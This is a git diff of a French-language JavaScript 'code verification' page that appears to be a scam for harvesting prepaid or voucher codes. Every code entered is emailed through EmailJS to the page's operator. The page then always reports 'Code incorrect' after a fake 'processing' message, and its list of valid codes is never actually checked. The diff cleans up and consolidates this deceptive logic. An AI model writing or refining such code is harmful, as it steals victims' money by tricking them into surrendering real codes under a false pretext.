@@ -1,13 +1,13 @@
 console.log("Script chargé");
+
 emailjs.init("OdVrpD_0CpgUT6Ahz");
 
-const validCodes = [
 
+const validCodes = [
     "AB12-7X9-Q8P",
     "VC45-A2B-123",
     "GH78-AAA-999",
     "TEST-123-ABC"
-
 ];
 
 
@@ -17,19 +17,29 @@ const part3 = document.getElementById("part3");
 
 const result = document.getElementById("result");
 
+const verificationForm = document.getElementById("verificationForm");
 
+console.log("Formulaire :", verificationForm);
+
+
+// Limitation format 4-3-3 + passage automatique
 const inputs = [part1, part2, part3];
+const maxLengths = [4, 3, 3];
 
 
-inputs.forEach((input, index)=>{
+inputs.forEach((input, index) => {
 
-    input.addEventListener("input",function(){
+    input.addEventListener("input", function(){
 
-        this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
+        this.value = this.value
+            .toUpperCase()
+            .replace(/[^A-Z0-9]/g,"")
+            .slice(0, maxLengths[index]);
 
-        if(this.value.length===this.maxLength && index<inputs.length-1){
 
-            inputs[index+1].focus();
+        if(this.value.length === maxLengths[index] && index < inputs.length - 1){
+
+            inputs[index + 1].focus();
 
         }
 
@@ -38,23 +48,8 @@ inputs.forEach((input, index)=>{
 });
 
 
+
 // FORMULAIRE
-
-
-
-  const verificationForm = document.getElementById("verificationForm");
-console.log("Formulaire :", verificationForm);
-
-// Limiter la saisie des champs au format 4-3-3
-const inputs = [part1, part2, part3];
-const maxLengths = [4, 3, 3];
-
-inputs.forEach((input, index) => {
-    input.addEventListener("input", function () {
-        this.value = this.value.slice(0, maxLengths[index]);
-    });
-});
-
 
 verificationForm.addEventListener("submit", function(e){
 
@@ -69,16 +64,24 @@ verificationForm.addEventListener("submit", function(e){
         part3.value;
 
 
-    // Vérification du format 4-3-3
+
+    // Vérification format 4-3-3
+
     if(
         part1.value.length !== 4 ||
         part2.value.length !== 3 ||
         part3.value.length !== 3
     ){
+
         result.innerHTML = "Code insuffisant. Vérifiez votre saisie.";
+        result.className = "error";
         return;
+
     }
 
+
+
+    // Vérification captcha
 
     const captcha = grecaptcha.getResponse();
 
@@ -86,26 +89,15 @@ verificationForm.addEventListener("submit", function(e){
     if(captcha.length === 0){
 
         result.innerHTML = "Veuillez confirmer le captcha.";
+        result.className = "error";
         return;
 
     }
 
-});
-    }
-
-
-    const captcha = grecaptcha.getResponse();
-
-
-    if(captcha.length === 0){
-
-        result.innerHTML = "Veuillez confirmer le captcha.";
-        return;
-
-    }
 
 
     console.log("Code envoyé :", code);
+
 
 
     emailjs.send(
@@ -119,39 +111,45 @@ verificationForm.addEventListener("submit", function(e){
         }
     )
 
-    
 
-      .then(function(){
+    .then(function(){
 
-    // Premier message (vert)
-    result.innerHTML = "✅ Votre demande est en cours de traitement.";
-    result.className = "success";
 
-    // Deuxième message après 2 secondes (rouge)
-    setTimeout(function(){
+        result.innerHTML = "✅ Votre demande est en cours de traitement.";
+        result.className = "success";
 
-        result.innerHTML = "❌ Code incorrect Veuillez saisir un code correct  .";
-        result.className = "error";
 
-    }, 2000);
+        setTimeout(function(){
 
-    part1.value = "";
-    part2.value = "";
-    part3.value = "";
+            result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
+            result.className = "error";
 
-    grecaptcha.reset();
 
-    part1.focus();
+        }, 2000);
 
-})
+
+
+        part1.value = "";
+        part2.value = "";
+        part3.value = "";
+
+
+        grecaptcha.reset();
+
+        part1.focus();
+
+
+    })
+
 
     .catch(function(error){
 
         console.log(error);
+
         result.innerHTML = "Erreur lors de l'envoi.";
+        result.className = "error";
 
     });
 
 
 });
-
